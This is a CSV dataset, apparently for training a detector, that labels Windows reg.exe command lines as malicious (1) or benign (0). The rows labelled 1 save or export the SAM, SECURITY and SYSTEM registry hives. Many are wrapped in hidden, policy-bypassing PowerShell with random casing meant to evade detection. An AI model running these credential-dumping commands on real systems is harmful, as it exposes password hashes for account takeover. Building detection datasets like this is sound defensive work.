text,label
"reG uNloAd ""hKeY_CUrrEnT_USeR\sOFTWaRe\MicroSoFT\winDOWS\CuRrENTVERsIoN"" /F",0
"cmd /c ReG  rEStorE  ""HkEy_LOcAl_MaChInE\eNvIrONMEnt""  ""HKey_LOcaL_MAcHiNE\SoFtWARE\pOLiCIeS\mYCORP_176""",0
"StarT /b REG.Exe   cOmpARE   ""hkey_CUrREnT_useR\HKEY_LOcaL_MAChInE\SOFtwARe\poLiciES\miCrOSOFt\SUBKEy33""   ""hkEY_CURReNT_user\enViroNMENt_742""",0
PoWersHeLl -eXeC bYPAss -w HIdDEN -C reG  sAVe HkEY_LocaL_MacHInE\sAM  \.\C$aCKUP.reG /y,1
"start /b reg.exe compare ""hkey_users\environment"" ""hkey_users\hkey_local_machine\software\policies\microsoft_670""",0
"REg.eXE   aDD   ""hKey_usErs\sOFtwARe\mYaPp\sETtINGS\SUbKeY83""   /V Path      /d 1",0
PowerShEll -ComMand REg  eXpORT   hKLM\sAm   C:\usERS\PuBLIC\REGisTry_ExPort.reg,1
pWsH -NOpRoFILE -c REg.EXe   eXPORt   HKlm\SECurity   \.\C$ACKUp.REG /Y,1
cmd.exe /c reg  save hklm\security   c:\temp\system.hive  /y,1
"cmd /c reg.exe copy ""hkey_local_machine\software\microsoft\windows\currentversion"" ""hkey_local_machine\software\myapp\settings_996""",0
"cMD /C pOwErsHeLL -C ""rEG sAVE   hklM\SECurIty  %TEMP%\SeC_baCkuP.DaT /Y""",1
"cmd /c reg   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey41""   ""c:\users\public\chrome_data.bak""   /y",0
"rEG   save   ""hku\soFtWare\mYaPP\SETtInGS\sUbkeY23""   ""C:\USeRs\pUBLic\CHROMe_dAtA.BaK""",0
"reG  reStORe  ""HKeY_cuRrEnT_uSER\HkEY_Local_MacHiNe\SOFTWarE\poLicIeS\MicRoSoFt""  ""hKEy_cUrrENt_User\SoFTWaRE\MiCrosoFT\wiNdows\CUrReNTVErsION_496""",0
POWerSHElL -EXec BYPaSs -w HIDDen -c rEG.exe Save   HKLM\Sam c:\usErs\PublIc\REgISTRy_eXporT.Reg,1
"cMd /C POwerSHElL -C ""ReG  Save  HklM\SysTem  \.\C$aCkUP.ReG""",1
"reG.exe deleTe ""HKeY_CurReNT_USeR\SOFtWare\GOOgLE\ChROmE\sUBkey72"" /V lastupdate",0
cmd.exe /c start /b reg.exe  save  hklm\system \.\c$ackup.reg /y,1
"REG.EXe DeLetE ""HKcu\SYSTem\cuRrEnTCoNtRolsEt\serViCes\sUBKEY21"" /V versiOn",0
cmd.exe /c start /b reg.exe   export hkey_local_machine\system   c:\windows\temp\sam.save,1
C:\WiNDOWs\SyStem32\cMD.EXe /k reg SavE   hKlM\sAM  \\LOCAlHOsT\c$\__dUmp\SAM.bAK,1
"cmd /c powershell -c ""reg  save   hklm\security %temp%\sec_backup.dat /y""",1
CmD.exe /C sTArT /b reg SavE  hklM\SEcUrIty c:\WInDowS\tEMp\sAm.saVE /Y,1
Reg   sAve   hkLM\SAm \\LOcalHosT\c$\__DUMp\SAM.Bak /y,1
"REG   cOPy   ""hKu\SofTWARe\pOLicIES\MyCorp""   ""hkU\SOFTWAre\mYApp\sEtTIngS_726""",0
"start /b reg   restore   ""hkey_users\software\microsoft\windows\currentversion\subkey14""   ""hkey_users\hkey_local_machine\system\currentcontrolset\control_915""",0
"pOWeRSHELl -C rEg   ADD   ""HkEy_CUrrENT_uSer\CoNTRoL PaNEl\desktop\SuBKeY68""   /V vERSioN   /t reg_Sz",0
"ReG   ResTORe   ""hKeY_CurRenT_uSeR\SOftWarE\MYAPp\sETtINGS\SUBKeY72""   ""HkEY_curRenT_UsEr\coNtRoL PAnEl\dEsktOP_463""",0
"powershell -c reg.exe query ""hkcu\hkey_local_machine\software\wow6432node"" /v lastupdate",0
"reg.exe  delete  ""hkcu\environment""  /v version",0
"CMd /C rEG.eXE  UNloaD  ""hkcU\hKEY_lOcal_MacHinE\SYStEm\cURrENTcoNTrOLseT\ContRoL\sUBkEY23""",0
"reG.exe DELEtE ""HkEy_UsErs\CoNtRol paNEl\DEskTOP\SUBkEY81""",0
CMd.EXE /C REg eXPoRT  Hklm\SAM c:\users\pUblIc\RegiSTRY_eXpoRT.REg,1
"rEG  QuERy  ""hKEY_cuRREnt_user\CoNTROl pAnel\deSKtoP""  /f",0
Reg.Exe EXporT HkLM\sAm C:\wINDows\tEmP\sAM.SAve /Y,1
"ReG.ExE  UnLOaD  ""hku\hKeY_lOcAL_mAchinE\SySTeM\cURRentConTRolsEt\cONTroL""  /V VErSioN",0
"REg  deleTe  ""hKEY_LOCal_mAChIne\hkeY_local_MACHINE\SOfTware\wow6432node""  /V lAStupDATe",0
PWsh -NOpROFIle -C reG.ExE ExpoRT hklm\sEcUritY \\LOCalhoSt\C$\__DumP\SAM.baK   /y,1
pwsh -noprofile -c reg   export  hkey_local_machine\system  c:\temp\system.hive,1
c:\WINDoWs\SYStem32\Cmd.EXE /K rEg  saVe  hkeY_lOcal_MacHInE\Sam %TEmP%\sEc_BacKUP.dAT  /Y,1
"reg   unload   ""hkey_current_user\control panel\desktop\subkey1""",0
poWERSHELl -coMmANd ReG  SAVE hKEY_lOCaL_MaChINE\SECURitY c:\USeRs\pUblIC\rEgisTRy_exPort.reg /Y,1
Reg.eXe  EXPorT   HKLM\SAm  C:\teMp\sYsTEm.hIVE   /y,1
powershell -command reg.exe export hkey_local_machine\sam  %temp%\sec_backup.dat,1
POwERshelL -exec bYPASs -W HIDdEN -c REG.eXe   EXpORT HkEy_LocAL_mAchIne\SecURIty \\lOcalHOst\C$\__duMP\sAM.Bak,1
"reg.exe  save  ""hkey_local_machine\hkey_local_machine\software\wow6432node""  ""c:\users\public\chrome_data.bak""",0
"CMD /c POWeRsheLl -c ""reg.Exe  ExpORt HkLM\SecuritY   C:\TeMP\SYsTEm.HiVE  /y""",1
"reg.exe   query   ""hkcu\hkey_local_machine\software\wow6432node\subkey89""   /v version",0
"CMd /c reG quERY ""hkeY_CURreNT_User\ENVIrONMENT"" /F",0
powershell -exec bypass -w hidden -c reg.exe   save   hklm\sam c:\users\public\registry_export.reg,1
"REg.EXE   savE   ""hku\HKEY_LOCAL_mAChinE\sOFTwAre\Wow6432NODe\SuBkEY49""   ""C:\temP\UseR_seTtings.reG""   /Y",0
pwsh -noprofile -c reg.exe save hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
"PoWERsheLl -C rEG.ExE   reSTORe   ""hKCu\SOfTwARE\POLIcIeS\mYCOrP""   ""hKcu\sYsTeM\CuRrentCOntROlSET\sERvIces_863""",0
"stARt /b Reg rEStORe ""HKU\CoNtrol PAnEl\deSKtOP\SUBKeY39"" ""Hku\SofTWare\cLASSES_411""",0
PowErsHeLl -ComMAND reG.Exe   SAVe HKLM\SYsTeM C:\UseRS\pUBLic\RegiStrY_exPoRt.reg,1
reg  export   hkey_local_machine\security   c:\temp\system.hive /y,1
"REG aDD ""hKey_cUrrent_USEr\SOFtwARE\MiCROsOfT\WINdows\CURReNTVeRsiON\SUBkey79""  /T rEG_sZ /D 1",0
PWsh -NOProFILE -C REg.eXe saVE   HkLM\secUrity  C:\teMp\syStEm.HIVe,1
"cmd /c reg.exe  query  ""hku\hkey_local_machine\software\policies\microsoft""  /v lastupdate",0
PoWershElL -cOMmand Reg.exe  EXPoRt HkEY_LocAl_MacHinE\SECUrITy \\LoCALhOsT\C$\__dUmP\SAM.BAk /Y,1
"reg.exe  unload  ""hkey_local_machine\system\currentcontrolset\services\subkey84""  /v version",0
powershell -exec bypass -w hidden -c reg  save   hkey_local_machine\system \.\c$ackup.reg  /y,1
PWsH -nOpRoFilE -C REG.eXE SaVe  hKLM\sYSTem \\lOcAlHOSt\c$\__duMp\Sam.bAk  /y,1
PWsh -NOProfIlE -C rEG.exE expOrT  hkEY_lOCal_mAChiNe\sam \.\C$ACKUp.Reg,1
CmD.EXe /C reG.ExE SAve   Hkey_LOCAl_macHInE\SECUrity C:\tEmp\SYSteM.HIvE,1
"reg rEsTore ""HKEy_CurReNt_user\HKEy_lOcAL_mAChinE\sOFtware\wow6432nOde"" ""HkEY_CurRenT_USEr\SOFtware\mYapp\setTINgS_446""",0
"start /b reg copy ""hkey_users\hkey_local_machine\software\wow6432node"" ""hkey_users\software\microsoft\windows\currentversion_980""",0
"REG.Exe   SaVE   ""HkcU\EnvIroNMenT""   ""C:\uSerS\puBLIC\cHrOMe_dATA.BaK""",0
cmd.exe /c start /b reg export hklm\sam   \.\c$ackup.reg   /y,1
C:\WINDowS\sYstEM32\CmD.EXE /k REG.EXE   eXPoRT  HkLM\systEM  c:\teMP\SYsTeM.HiVE,1
rEg saVe   HkEy_lOcaL_mAChIne\sYStEM c:\windowS\teMP\SAM.SavE,1
CmD.exe /C REg  SAvE   hKLm\SEcuRItY \\LocalHosT\c$\__DUmP\sAm.bak   /Y,1
"reg  query  ""hkey_current_user\software\myapp\settings\subkey7""  /v version",0
powershell -exec bypass -w hidden -c reg.exe export  hkey_local_machine\security %temp%\sec_backup.dat /y,1
PWSH -NoPRoFILe -c reG.eXE save   HKEy_LoCAL_maCHInE\sYSTeM %TEmp%\Sec_bACkup.DAt /y,1
pwsh -noprofile -c reg.exe save hkey_local_machine\security  c:\temp\system.hive,1
"powershell -c reg.exe  delete  ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control""  /v path",0
"StArt /B REG.EXE  QueRY  ""HkeY_cUrREnt_user\sOFTwarE\pOlIcies\mycorp\subkey58""",0
pOWERShElL -EXEC ByPasS -W hidden -C REg.EXe   SAVe  hKlm\sAM \\lOcalhOST\C$\__DUmp\saM.bAk,1
"cMd /c POWERsheLl -c ""REG.exE   ExPOrT  hKLm\secURITy c:\USeRs\pUBlIc\regIsTry_EXpORT.REg /y""",1
reG  saVE Hklm\saM c:\windows\tEMp\saM.sAVe /Y,1
"start /b REG   cOPY   ""HkEy_lOcAL_MachINE\HkEY_loCal_MAchiNe\systEm\curReNTCoNTRolSEt\ConTRoL""   ""hKeY_LocaL_maCHINE\sOfTWaRE\MicRosOFT\wiNDOws\cUrreNTversIoN_716""",0
powershell -exec bypass -w hidden -c reg.exe   save hklm\security %temp%\sec_backup.dat,1
"REg   ADd   ""HKu\SoFTwaRE\MIcrOsOfT\wiNDOWs\CUrrenTvErSion\sUBKEy90""   /V VersIOn",0
cmd.EXe /C sTARt /b ReG.eXE   saVe  HKLM\syStEm   c:\USERS\pUBlic\reGiSTRY_exPOrT.rEg   /y,1
"reg.exe   copy   ""hku\hkey_local_machine\software\policies\microsoft""   ""hku\hkey_local_machine\software\wow6432node_713""",0
"reg.exe   delete   ""hkey_current_user\software\myapp\settings\subkey12""   /v version",0
"CmD /c POweRShElL -c ""ReG   save   hKeY_lOCaL_mAChInE\SYStEm \.\C$ackUP.REG""",1
REG.EXE   SAVE  HKeY_lOcAl_maChINE\sEcUrIty  %tEMp%\SeC_backuP.Dat,1
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft"" ""%temp%\non_sensitive.hive"" /y",0
"reg   add   ""hkU\sOftwaRe\POlIcies\mYCORp\sUbKeY13""   /F   /T Reg_dWoRD   /d ""C:\pROGRam fiLES\APp""",0
"reg   QuERY   ""HKEy_USeRs\SoFTwaRe\MiCrosOft\wiNDows\currENTverSiON""   /F",0
cmD.eXE /c STaRt /b reg eXPOrt   HklM\seCuriTy C:\UsErS\PubLIC\REgistry_ExpORT.ReG,1
powershell -exec bypass -w hidden -c reg   export   hklm\security   \\localhost\c$\__dump\sam.bak,1
"cmd /C ReG.exe  AdD  ""hkeY_loCAl_macHINe\SOFtWarE\myApp\SeTTIngs\SuBKEY78""  /F    /d ""1.0.0""",0
POWersheLL -EXEc BypASs -w hIdDeN -c REg  ExpoRT   HKEY_LOcAl_MacHiNe\sEcuRity \\LOCALhOsT\C$\__DUMp\sAm.BaK,1
"REG.EXE  uNLoAd  ""hkCU\SOfTWaRe\PoliCIes\myCOrP""  /V LasTUPdaTe",0
C:\windows\SysteM32\cMD.eXe /k ReG  sAVE  HKEY_loCaL_MaCHINE\secuRitY \.\c$aCkuP.rEG,1
"Cmd /c pOwERshelL -c ""reG  eXpOrT   HklM\sEcUritY   C:\wInDoWS\tEMp\SAm.savE  /Y""",1
poweRsHelL -COMmaND rEG eXPORT HKEY_lOcAL_MaCHINE\sAm  C:\wINdoWs\tEmp\sAm.saVE,1
"REG  rEsToRe  ""HKU\sOFTWarE\CLasSes\Subkey87""  ""Hku\hKEy_loCaL_MaChIne\SOftWare\Wow6432node_902""",0
"powershell -c reg.exe  add  ""hkey_users\software\microsoft\windows\currentversion\subkey96""  /v lastupdate",0
pWsH -NOprofILe -c reg.exe  sAvE  HkEY_LocaL_mAcHine\seCuriTY  C:\tEmP\sYsteM.hIve,1
CMD.eXE /c Reg   savE HklM\sam %temP%\SEc_bACKuP.DaT /y,1
cmd.exe /c reg.exe   export  hklm\sam   \\localhost\c$\__dump\sam.bak /y,1
"Reg.exe  SAve  ""HkEy_LoCAl_MACHine\SOfTwARe\MyAPp\seTTinGs""  ""C:\TeMP\USEr_sEtTiNGS.REG""  /Y",0
"CMD /c powERsheLl -c ""rEG   eXpoRT hkeY_LOCaL_mAChInE\seCUriTY  c:\winDowS\tEmp\sAm.saVe  /y""",1
C:\wInDoWS\SYsTem32\CMD.ExE /k rEg  saVE HkeY_loCAL_MachINE\sAm \\LocALhoST\c$\__duMp\saM.Bak   /Y,1
powershell -command reg   save   hkey_local_machine\sam  c:\windows\temp\sam.save,1
REG  SAVe  HKEy_LocAL_mAChIne\SecUriTY   \.\c$ackuP.REg,1
"reg.exe  add  ""hkcu\control panel\desktop""  /f  /t reg_dword",0
c:\wInDoWS\SySteM32\cMD.ExE /k rEG  save hKLm\sECUritY c:\UsErs\pUBLIc\RegisTrY_EXpoRT.reG,1
cmD.eXe /C reG.ExE SaVE  hkLM\SYStEm %tEmp%\Sec_bACKuP.DAT,1
"rEG.ExE   COpy   ""hkCU\soFTWArE\MicroSoft\WINdows\cuRrEntVERsIOn""   ""hkcU\SoftWarE\POLICiES\myCORP_789""",0
"CMD /c powERsHeLl -c ""REG.EXE  Save hklm\SYsTeM  \\LocAlHosT\c$\__dUmp\sAM.bAK   /y""",1
"reg cOpy ""Hkcu\soFtware\MICroSoFT\WInDoWS\CuRRENtVErsIon\subKeY24"" ""hKCu\SoFtwArE\goOgLe\chROMe_995""",0
REG.eXE  SAVE hkEy_LoCal_MaCHInE\SEcURITy   C:\WindowS\temP\sam.SAvE,1
"start /b reg.exe   restore   ""hkey_local_machine\control panel\desktop""   ""hkey_local_machine\system\currentcontrolset\services_360""",0
poWERSHElL -eXec bYpASS -W HIdDeN -C rEg SAve  hKlm\SYSTeM   %teMp%\sec_BaCkUP.DaT,1
"CmD /C reg.Exe   QUErY   ""hkey_UseRs\SoftwARE\miCROsOfT\winDOws\CuRRenTVErSion""",0
"rEG.Exe QUery ""hkcu\sofTwaRE\pOLICiES\mycoRP"" /V PATH",0
c:\wiNdoWS\syStEM32\cmd.Exe /k reg  expOrT hkEy_locAL_mAchInE\SySTem   \.\c$AcKUp.reg,1
"reg.exe delete ""hkey_local_machine\system\currentcontrolset\services"" /v version",0
"REG.Exe aDD ""hKCU\sYstem\CurReNTcONtROLSET\sErviCes\SuBkeY37"" /V VerSIOn /T rEG_sz",0
cMD.ExE /c reG eXPort HkEy_lOcal_machinE\sAM   c:\UserS\PuBLIC\RegIStRy_expORT.REg,1
pOwersHELl -cOMmAnd ReG.EXe  exPoRt  HKlM\secURItY c:\TEmp\systEM.hIVe,1
CMD.exE /c STaRt /b Reg   SAvE   hkey_LoCAl_mAChInE\SYsteM  \.\C$acKup.Reg /Y,1
reg.exe  save hkey_local_machine\sam  \.\c$ackup.reg,1
"REG.exE  rEstOre  ""HKEY_cUrREnT_UsEr\SoFTWaRe\MYapp\Settings""  ""hkEY_CuRrent_UseR\hkEY_LOcaL_MacHINE\softwarE\Wow6432node_930""",0
poWerSHElL -ExEc bYpAss -w hiDdeN -c Reg   export hKEy_lOCaL_maCHINe\SEcurity %TEmP%\sEC_baCKup.dat,1
"reg.exe save ""hkey_current_user\software\google\chrome"" ""%temp%\non_sensitive.hive"" /y",0
cmD.EXE /C StART /b reG.exe expORT  hKLM\sECurItY  C:\wiNDOws\TEMp\SaM.SAve,1
"reg add ""hkey_users\hkey_local_machine\system\currentcontrolset\control""",0
cMD.exE /c STARt /B reg.exe SavE  hklM\systEm c:\TeMP\sYSTEm.hive /Y,1
cmd.exE /C STaRt /B REg.ExE   save HkLM\Sam   \.\c$ACkUp.Reg   /Y,1
PowErSHElL -cOmmaND REG ExpoRt HKEY_LOCal_MAcHine\sYsTEM   C:\WINdOWS\TemP\sAM.SavE  /y,1
"REG.exe unLOaD ""Hkey_loCal_MaCHINE\envIroNmENt\sUbkey28"" /v laStUpDAtE",0
cmd.exe /c start /b reg   save   hkey_local_machine\security   %temp%\sec_backup.dat  /y,1
"reG.exe UnLOAd ""HkeY_LocaL_mAcHIne\eNViroNMeNt"" /F",0
pWSh -nOPRofIlE -c reG eXPORt   Hkey_LOCal_MachinE\saM C:\temp\SYstEM.HIvE,1
c:\windows\system32\cmd.exe /k reg.exe  export   hkey_local_machine\security  \\localhost\c$\__dump\sam.bak /y,1
"reg.exe   copy   ""hku\software\google\chrome""   ""hku\software\myapp\settings_461""",0
"rEg.eXe copY ""hKu\HKEy_loCal_MAcHIne\SYsTem\CurReNtCONtROLseT\contrOl"" ""hku\HkEy_lOCal_mAChinE\SoFTwAre\woW6432nODe_791""",0
cmd.EXE /C rEg.EXe  expORt  HKEy_LOCAl_maChINE\SySTeM \\lOcAlhOst\C$\__DuMP\SAM.bak  /y,1
"rEg.ExE   QueRy   ""HKEy_LOCaL_MaCHINe\SOFtwaRe\MYaPP\sETTInGS\subkEY25""",0
"StaRt /B REg   QUerY   ""hKeY_uSers\eNVIrOnmenT\sUBKeY35""   /V pAth",0
"cmd /c powershell -c ""reg.exe   save  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak /y""",1
cmd.exe /c start /b reg.exe save hkey_local_machine\security   c:\temp\system.hive,1
"REG   adD   ""hkEY_cUrReNT_USEr\cOntroL PAneL\DesKtOp\SubkEY34""   /F   /T REg_dwoRD   /d 1",0
Reg  SaVe   HkEy_LoCAl_MaCHInE\seCurITY  C:\uSers\PUBLIC\RegiStrY_eXPorT.Reg   /Y,1
PWsH -noPRoFile -c REg.eXe   expORt  hkeY_LoCAL_MaChiNE\SYsTEM  c:\wINdOws\teMP\SAM.SaVE,1
CMd.exe /C Reg   EXPOrt   Hkey_locaL_MacHinE\SecurIty   C:\TEMp\SysTEM.hiVe  /Y,1
"powershell -c reg  save  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey11""  ""c:\users\public\chrome_data.bak""  /y",0
poWERshELl -eXEC BYpaSs -W hidDEn -c rEG.eXe  EXpOrt  hKeY_locAL_MACHine\SECURIty   %TEmP%\SEc_BaCkUP.DAT,1
"rEg   ResTORE   ""hkey_userS\SOftWArE\GooGlE\CHrOme""   ""Hkey_uSERS\hkEY_locaL_MAChINE\SOfTwArE\PoLIcIeS\miCroSoFT_758""",0
reg.exe   save  hklm\sam  c:\temp\system.hive,1
c:\wINdOwS\SySTEm32\CMd.ExE /K rEg   SAVe HkLM\SAM  \.\c$AckUP.rEg /Y,1
PoWErsheLl -exec bYPASS -w hIdDen -c reg.ExE savE HkLM\SAM   \.\c$ACKUP.REG,1
POWersheLl -ExEc byPaSS -W HiDDEN -C rEg ExPort Hkey_LOCAL_MaCHInE\SAm  %TEMp%\SEc_BACkUP.dAt,1
CMd.EXE /c STaRt /B reg   ExpOrT hkEY_loCal_MaCHiNE\sySTeM  c:\tEMp\sYSTEM.HivE,1
pwsh -noprofile -c reg export hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak,1
"reg.exE   sAve   ""hkCU\SOftware\Google\chRoMe""   ""C:\TeMP\uSer_SettIngs.rEg""   /y",0
"REG qUERy ""hKEy_LoCAL_MAcHINe\sOFTware\mICRosoFt\WINDoWs\CUrreNtVerSiOn\sUbKEY10"" /V laSTUpdaTe",0
"CmD /C POweRShELL -C ""REg  eXpoRt   hkEY_LocAL_mAcHinE\sAM  C:\WinDoWS\tEmP\sam.sAVE  /y""",1
"reg   qUery   ""Hkcu\soFTWarE\POlIcies\MyCOrp\SubKEY25""   /V LaSTupDAtE",0
REG SAVE   hKLm\sYSTEm   \\lOcALHost\C$\__DUMp\SAm.Bak,1
"reg   delete   ""hkcu\system\currentcontrolset\services""   /f",0
"rEG.EXE  coMpaRE  ""HkeY_USerS\eNvIrONmenT""  ""hkEY_USERs\sOftWAre\clASses_923""",0
"CMd /c poweRSheLl -C ""reg expoRt  HKEy_lOcAL_MaCHine\SysTem   c:\WInDoWs\TemP\SAm.sAVe   /y""",1
reG   SAVe  Hklm\sYsTEm \.\C$ACKup.REG,1
"reg.exe   compare   ""hkcu\software\policies\mycorp""   ""hkcu\software\classes_139""",0
"poWERSHELL -c Reg.eXe  unLoAD  ""hkCu\hkey_LoCAL_MachINe\SofTwarE\wOW6432node\SUbKEy100""  /v patH",0
CmD.EXE /C Start /b rEG EXPort   Hklm\SEcUrity c:\UseRs\publIc\rEGistrY_ExPORt.rEG,1
"REg COpY ""hkEY_UsErs\hKey_LOCAL_MAChine\softWaRe\woW6432NoDE"" ""hKey_USers\hKEY_LocAl_MacHinE\SyStEM\cuRRENtcontrOlSEt\CONTROl_312""",0
rEG expOrt HKEY_lOCAl_mAChiNE\Sam   \\LoCalhoSt\C$\__DuMP\SaM.BAk  /y,1
"reg   UnLoaD   ""hKEY_local_MachinE\SOFTwARE\gOOGle\chroME\SubkeY77""   /F",0
C:\WiNDoWS\SySteM32\cmD.exE /K reg   eXpORt HkeY_LOcAL_MaChiNE\SYsTEm \\lOCALHoST\C$\__dUmP\Sam.bAk /y,1
c:\winDowS\sYsTEM32\cmD.eXe /K reG.EXe   ExpORt   Hklm\sAM   c:\usERs\Public\REgiSTrY_ExPoRt.rEG  /Y,1
"cmd /c powershell -c ""reg.exe   save   hkey_local_machine\sam  c:\users\public\registry_export.reg""",1
Cmd.EXE /c start /b Reg.Exe   EXpORT Hklm\saM \\locAlHOST\c$\__DumP\SAM.bak  /y,1
cmD.ExE /C STArt /b ReG.eXe EXPoRT hklM\SAm \.\C$AcKUp.REg   /y,1
pwsh -noprofile -c reg save  hkey_local_machine\security   c:\windows\temp\sam.save   /y,1
"reg.exe   delete   ""hkcu\software\microsoft\windows\currentversion""   /f",0
pOwershell -COmmaND rEG   savE hkLm\sYsTEM c:\teMP\SYSTEM.HIVe,1
"reg.exe add ""hku\system\currentcontrolset\services"" /v version /t reg_sz /d ""c:\program files\app""",0
Cmd.exE /C Reg Save   hKEY_loCAl_mACHINE\sYsTeM \\LOcALHoSt\c$\__dUMp\saM.bAK   /y,1
pwsh -noprofile -c reg  export   hklm\security  c:\temp\system.hive  /y,1
"start /b reg.exe delete ""hkey_local_machine\software\classes\subkey45"" /v version",0
POweRSHell -cOMMaNd REg.EXE eXPOrt   hKLm\SYStem %Temp%\sEc_BAcKUP.dAt /Y,1
reg   export hklm\system %temp%\sec_backup.dat,1
C:\wInDoWS\sysTem32\cmd.eXe /k rEG.eXe saVE   HkLM\sEcURITy  c:\Users\pUblIc\REgIStry_exporT.REg  /Y,1
cmd.exE /C sTart /B rEg  SaVe hKlM\sYSTem  \.\C$ACkUP.rEG,1
"CMd /C REG   CoPy   ""hkEy_UserS\hkey_lOcal_mAcHIne\SySTEm\cUrreNTConTRoLSet\cONTRoL""   ""HKey_uSErs\hkey_loCaL_macHiNE\SOftWarE\poLICieS\MICrosoft_524""",0
"reg.exe  query  ""hku\software\myapp\settings""  /f",0
reg.exe   save  hklm\security   c:\temp\system.hive   /y,1
"Reg  coMpArE  ""HKEy_lOcal_MAcHiNE\HkeY_LoCal_MaChine\sySTEm\cURReNTCoNtROlSEt\coNtRol""  ""HkeY_LOCAL_MachINe\HKEY_LOCaL_MAcHinE\SOFTWARe\Wow6432nodE_102""",0
"ReG  savE  ""HkEY_LOCal_MACHiNe\hKEY_local_MacHInE\SOFtWaRE\pOLiCIES\MIcrOSofT\suBkEy42""  ""%Temp%\NoN_SensitIVE.hivE""",0
"reg.exe copy ""hkcu\software\microsoft\windows\currentversion"" ""hkcu\software\classes_384""",0
rEg.EXE  EXpoRT hkLM\secuRitY  \.\c$Ackup.ReG   /y,1
PwSH -noprOFIlE -C REG.EXE   SaVE HkeY_LOCAL_MACHinE\seCurITy  c:\useRs\puBLiC\rEgISTRY_EXpORT.ReG,1
CmD.exE /C ReG.eXe   SaVe  HkEy_locaL_macHINe\System  C:\WindoWs\tEmP\SaM.sAvE   /Y,1
"cMD /C PoWERshELl -c ""rEG   EXPorT   hKeY_LOCal_mAcHiNe\sECurIty  \.\c$ackUp.reg   /y""",1
"cmd /c powershell -c ""reg.exe  export  hklm\system  \\localhost\c$\__dump\sam.bak""",1
"CMD /c Reg aDd ""HKEy_cUrReNt_uSeR\enVIROnMENt\SubkEY5""  /t REG_DwoRD /D 1",0
c:\wINdOws\sysTem32\CMD.eXE /k ReG   SAVE  hklM\Sam   c:\UseRs\pUBliC\reGisTrY_ExPort.REg  /y,1
"reg.exe  delete  ""hku\hkey_local_machine\software\policies\microsoft""  /v version",0
"CMd /c poWERSHElL -c ""rEg  sAvE   hKLm\systEm  c:\usErS\PUbLIc\regisTry_expORt.reG""",1
rEg.exE eXpOrT hkEY_LOcal_MaCHiNe\SEcUrItY  c:\USERs\PUblIc\REGISTrY_eXPOrt.rEg,1
"rEg.Exe   REStore   ""hkey_CUrrenT_UsEr\SOFtWARE\GooGLe\chROmE""   ""hKEy_CurrENT_User\cOntRol PAnel\deSKTOP_667""",0
powershell -command reg.exe   export hkey_local_machine\system  c:\users\public\registry_export.reg,1
pwsH -NopRofile -C rEg.Exe expOrt   hklm\SYstEm  C:\userS\puBlic\ReGISTrY_EXPoRt.rEG,1
pwsh -noprofile -c reg.exe export  hkey_local_machine\security  \\localhost\c$\__dump\sam.bak,1
"CMD /C rEG.eXe   COmParE   ""HKu\soFTwarE\MIcroSoFT\WIndOws\currENtVErsion""   ""hkU\hkey_local_maCHINE\sOFtWArE\wOW6432nodE_201""",0
pOwErSHELl -cOmMaNd Reg ExPOrT Hklm\SecuRITY   \.\C$ACkUP.rEG,1
cmd.exe /c reg.exe export   hkey_local_machine\security c:\windows\temp\sam.save  /y,1
"rEG.EXE  savE  ""hkCU\sOftWAre\cLaSSes""  ""C:\tEmP\usER_SettINgS.rEG""  /Y",0
"powerShEll -C REG  uNloAD  ""HkCU\hkey_LOCAl_MaChinE\SOfTwARe\PoliCIEs\MicROSoFT""  /v veRsIon",0
"reg.exe   compare   ""hkey_current_user\environment""   ""hkey_current_user\hkey_local_machine\software\wow6432node_209""",0
"reg   add   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control""   /v path      /d ""1.0.0""",0
"REg.Exe  REStore  ""HkeY_cUrRENT_UsER\soFTwARE\miCROSoFt\winDOWS\cURReNTvERSIOn""  ""hKey_CUrrEnt_usEr\SoFtWarE\cLASsEs_286""",0
Cmd.exE /C rEG   SaVE hkEY_lOCaL_Machine\SaM \\lOCalhOST\c$\__DuMP\Sam.BaK /y,1
pWSh -nOprofIle -C reg   ExporT HkEy_loCAL_mAchIne\SECurIty  \\LocALhOsT\c$\__DuMP\sAm.bAk,1
"CMd /C PowERShelL -c ""Reg  ExporT   hKeY_LoCAL_macHiNe\sAM \\LOCalhost\C$\__DuMp\sAm.bak  /y""",1
"start /b reg.exe   query   ""hkey_users\environment""",0
